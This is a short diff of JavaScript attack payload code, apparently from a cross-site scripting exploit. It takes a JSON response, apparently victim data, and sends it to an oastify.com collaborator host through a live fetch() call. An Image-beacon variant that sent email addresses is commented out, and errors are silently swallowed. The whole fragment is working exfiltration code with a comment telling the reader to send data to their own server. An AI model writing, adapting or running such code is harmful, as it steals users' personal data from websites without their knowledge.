@@ -6,8 +6,8 @@
     const json = await res.json();
 
     // Exfiltrate to your server
-    //await fetch("https://ta7mfh9hq3zkzpzy9evgp01luc03otci.oastify.com/collect?data=" + encodeURIComponent(JSON.stringify(json)));
-    new Image().src = "https://ta7mfh9hq3zkzpzy9evgp01luc03otci.oastify.com/collect?e=" + encodeURIComponent(emails);
+    await fetch("https://ta7mfh9hq3zkzpzy9evgp01luc03otci.oastify.com/?data=" + encodeURIComponent(JSON.stringify(json)));
+    //new Image().src = "https://ta7mfh9hq3zkzpzy9evgp01luc03otci.oastify.com/collect?e=" + encodeURIComponent(emails);
   } catch (e) {
     // Optional: silently fail
   }
